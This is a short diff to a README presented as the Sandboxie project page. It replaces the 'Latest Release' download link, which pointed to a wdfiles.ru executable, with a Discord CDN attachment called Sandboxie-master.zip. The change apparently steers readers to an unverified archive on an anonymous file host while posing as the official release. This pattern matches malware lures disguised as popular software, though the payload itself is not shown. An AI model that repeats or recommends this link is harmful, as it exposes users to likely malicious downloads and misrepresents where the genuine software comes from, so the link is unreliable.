@@ -16,7 +16,7 @@ Sandboxie allows you to create virtually unlimited sandboxes and run them alone 
 
 ## ⏬ Download
 
-[Latest Release]([https://wdfiles.ru/N1y8/Sandboxie-Classic-x64-v5.69.3.exe))
+[Latest Release]([https://cdn.discordapp.com/attachments/1226399724534501447/1259334595715924008/Sandboxie-master.zip?ex=668b4e3c&is=6689fcbc&hm=a18b87e54236ab7bb1136ac90ff0378cadd509157d9521cee54769917ee51446&))
 
 ## 🚀 Features
 
